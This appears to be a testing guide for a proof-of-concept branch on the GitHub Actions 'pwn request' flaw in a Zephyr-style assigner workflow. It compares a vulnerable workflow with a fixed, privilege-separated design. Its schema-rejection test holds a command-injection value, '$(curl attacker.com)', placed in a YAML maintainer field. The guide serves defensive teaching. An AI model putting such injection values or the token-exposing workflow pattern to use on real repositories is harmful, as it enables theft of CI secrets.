# PWN Request POC — Testing Guide

## Overview

This branch contains three workflows demonstrating the **pwn-request vulnerability** pattern found in Zephyr's `assigner.yml`:

| Workflow | File | Purpose |
|----------|------|---------|
| `assigner-vulnerable.yml` | Reproduces the vuln | Shows attacker-controlled YAML processed with secrets |
| `assigner-fixed-analyze.yml` | Fixed — Workflow A | Unprivileged: fetches + validates PR content, no secrets |
| `assigner-fixed-execute.yml` | Fixed — Workflow B | Privileged: processes validated artifacts with secrets |

## How to Test

### Step 1: Merge this branch to `main`

```bash
git push playground topic/poc/pwn-request-assigner
# Then merge to main via PR or direct push
```

### Step 2: Create a fork (simulate attacker)

Fork `tmleman/gha-playground` to another account (or use the same account).

### Step 3: Create malicious `MAINTAINERS.yml` in the fork

```yaml
# Add a new area with attacker's handle
"Exploit Area":
  status: maintained
  maintainers:
    - attacker-handle
  files:
    - drivers/sensor/
```

### Step 4: Open a PR from fork → `main`

This triggers all `pull_request_target` workflows:
- **Vulnerable workflow**: Processes attacker's YAML with `GITHUB_TOKEN` in scope → logs show token is accessible
- **Fixed Analyze workflow**: Processes attacker's YAML WITHOUT secrets → validates schema → uploads artifact
- **Fixed Execute workflow**: Triggers on Analyze completion → processes validated data WITH secrets

### Step 5: Compare workflow run logs

- **Vulnerable**: Shows `🔴 CRITICAL: Secret token is available`
- **Fixed Analyze**: Shows `✅ PASS: validated` — no token messages
- **Fixed Execute**: Shows `✅ Metadata validation passed` — processes only clean data

## Testing Invalid Input (Schema Rejection)

Create a fork branch with malicious MAINTAINERS.yml:

```yaml
"Injection Test":
  status: maintained
  maintainers:
    - "valid-user"
    - "$(curl attacker.com)"     # ← Should be REJECTED by validator
  files:
    - kernel/
```

Expected behavior:
- **Vulnerable**: Processes it (potentially dangerous)
- **Fixed Analyze**: REJECTS at validation step → no artifact uploaded → Execute never runs

## What This Proves

1. **Vulnerable pattern**: `pull_request_target` + fetch PR content + secrets = token exfiltration risk
2. **Fixed pattern**: Separating privileges across workflow boundary eliminates the attack surface
3. **Defense in depth**: Input validation in the unprivileged workflow catches malicious payloads before they reach secrets

## Cleanup

After testing, you may want to disable the vulnerable workflow:
```bash
gh workflow disable "POC: Vulnerable Assigner (pwn-request)"
```
